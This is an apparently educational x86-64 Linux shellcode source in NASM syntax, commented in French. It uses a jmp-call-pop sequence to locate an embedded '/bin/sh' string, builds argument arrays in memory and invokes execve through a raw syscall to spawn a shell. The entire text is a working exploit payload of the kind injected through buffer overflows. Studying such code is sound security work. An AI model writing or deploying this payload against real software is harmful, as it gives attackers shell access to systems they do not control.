BITS 64
    jmp short two
one:
    pop rdi; obtient l'adresse de la chaîne
    xor rax, rax
    mov [rdi+7], al
    mov [rdi+8], rdi; recopier l'adresse à une adresse
    mov [rdi+16], rax
    lea rsi, [rdi+8]; obtient l'adresse de l'adresse, cette adresse s'arrêtera à NULL
    lea rdx, [rdi+16]
    mov al, 0x3b
    syscall; execve("/bin/sh",["/bin//sh",NULL],[NULL])
two:
    call one
    db '/bin/shXAAAAAAAABBBBBBBB'